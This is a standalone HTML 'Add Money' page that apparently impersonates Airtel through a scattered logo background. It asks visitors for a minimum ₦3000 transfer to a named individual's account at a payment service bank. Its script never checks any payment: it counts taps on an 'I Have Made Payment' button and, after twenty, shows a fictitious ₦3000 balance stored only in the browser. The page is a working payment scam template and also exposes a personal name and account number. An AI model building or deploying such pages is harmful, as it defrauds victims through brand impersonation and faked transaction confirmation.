<!DOCTYPE html><html lang="en"><head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Add Money</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f9f9f9;
      margin: 0;
      padding: 20px;
      position: relative;
      overflow-x: hidden;
    }.container {
  max-width: 400px;
  margin: auto;
  background: #fff;
  padding: 20px;
  border-radius: 12px;
  box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
  position: relative;
  z-index: 2;
}

h2 {
  color: #d9001b;
  text-align: center;
}

input[type="number"] {
  width: 100%;
  padding: 12px;
  margin: 10px 0;
  border: 1px solid #ccc;
  border-radius: 8px;
}

button {
  width: 100%;
  padding: 12px;
  background-color: #d9001b;
  color: white;
  border: none;
  border-radius: 8px;
  font-size: 16px;
  cursor: pointer;
}

.popup {
  display: none;
  padding: 15px;
  background-color: #fff0f0;
  border: 1px solid #d9001b;
  color: #d9001b;
  text-align: center;
  border-radius: 8px;
  margin-bottom: 15px;
}

.account-info {
  display: none;
  background: #fff0f0;
  padding: 20px;
  border-radius: 10px;
  margin-top: 20px;
}

.account-info p {
  margin: 10px 0;
}

.logo-scatter {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  pointer-events: none;
  z-index: 0;
}

.logo-piece {
  position: absolute;
  width: 20px;
  height: 20px;
  background-image: url('airtel-logo.png');
  background-size: contain;
  background-repeat: no-repeat;
  animation: scatterIn 2s ease-in-out forwards;
}

@keyframes scatterIn {
  0% {
    transform: translate(calc(50vw - 10px), calc(50vh - 10px)) scale(0.1);
    opacity: 0;
  }
  100% {
    transform: translate(0, 0) scale(1);
    opacity: 0.1;
  }
}

  </style>
</head><body>
  <div class="logo-scatter" id="logoScatter"></div>  <div class="container">
    <h2>Add Money</h2><div class="popup" id="popup"></div>

<div id="formSection">
  <input type="number" id="amount" placeholder="Enter amount (min ₦3000)" />
  <button onclick="continueToPay()">Continue</button>
</div>

<div class="account-info" id="accountInfo">
  <p><strong>Account Name:</strong> EMMANUEL OKWUNNA</p>
  <p><strong>Bank:</strong> SmartCash Payment Service Bank</p>
  <p><strong>Account Number:</strong> 812 489 0070</p>
  <button onclick="tapPayment()">I Have Made Payment</button>
</div>

  </div>  <script>
    let tapCount = parseInt(localStorage.getItem('tapCount') || '0');
    let balance = parseInt(localStorage.getItem('balance') || '0');

    function showPopup(message) {
      const popup = document.getElementById("popup");
      popup.innerText = message;
      popup.style.display = "block";
      setTimeout(() => popup.style.display = "none", 3000);
    }

    function continueToPay() {
      const amount = parseInt(document.getElementById("amount").value);
      if (isNaN(amount) || amount < 3000) {
        showPopup("Please input a minimum of ₦3000");
        return;
      }
      showPopup("Please wait...");
      setTimeout(() => {
        document.getElementById("formSection").style.display = 'none';
        document.getElementById("accountInfo").style.display = 'block';
      }, 1500);
    }

    function tapPayment() {
      tapCount++;
      localStorage.setItem('tapCount', tapCount);
      showPopup("We are confirming your transaction. Please wait...");
      if (tapCount >= 20) {
        balance += 3000;
        localStorage.setItem('balance', balance);
        localStorage.setItem('tapCount', '0');
        showPopup("₦3000 added to your wallet!");
      }
    }

    // Logo scatter animation
    function createLogoScatter() {
      const scatter = document.getElementById("logoScatter");
      for (let i = 0; i < 40; i++) {
        const piece = document.createElement("div");
        piece.className = "logo-piece";
        piece.style.top = Math.random() * window.innerHeight + 'px';
        piece.style.left = Math.random() * window.innerWidth + 'px';
        scatter.appendChild(piece);
      }
    }
    createLogoScatter();
  </script></body></html>
